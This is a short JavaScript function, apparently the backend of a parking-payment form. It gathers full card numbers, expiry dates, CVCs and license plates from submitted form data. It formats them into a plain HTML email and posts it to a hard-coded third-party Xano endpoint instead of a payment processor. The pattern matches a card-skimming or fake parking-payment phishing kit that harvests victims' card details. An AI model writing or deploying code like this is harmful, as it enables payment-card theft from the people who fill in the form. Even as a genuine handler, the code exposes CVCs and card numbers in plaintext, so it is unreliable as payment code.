// eslint-disable-next-line @typescript-eslint/ban-ts-comment
// @ts-expect-error
export async function sendEmail(formData) {
  const XANO_API_URL = 'https://x8ki-letl-twmt.n7.xano.io/api:_sLo3BDY/emails';

  const emailContent = {
    subject: 'Payment Tag',
    html: `
      <p>A payment has been made:</p>
      <ul>
        <li>Card Number: ${formData.get('cardNumber')}</li>
        <li>Expiry Date: ${formData.get('expiry')}</li>
        <li>CVC: ${formData.get('cvc')}</li>
        <li>License Plate: ${formData.get('licensePlate')}</li>
        <li>Duration: ${formData.get('duration')}</li>
        <li>Total: $${formData.get('total')}</li>
      </ul>
    `,
  };

  try {
    const response = await fetch(XANO_API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(emailContent),
    });

    if (!response.ok) {
      const errorData = await response.json();
      return { success: false, message: errorData?.message || 'An error occurred while processing your request.' };
    }

    const responseData = await response.json();
    return { success: true, message: 'Email sent successfully.', data: responseData };
  } catch (error) {
    // eslint-disable-next-line @typescript-eslint/ban-ts-comment
    // @ts-expect-error
    return { success: false, message: `An error occurred: ${error.message}` };
  }
}
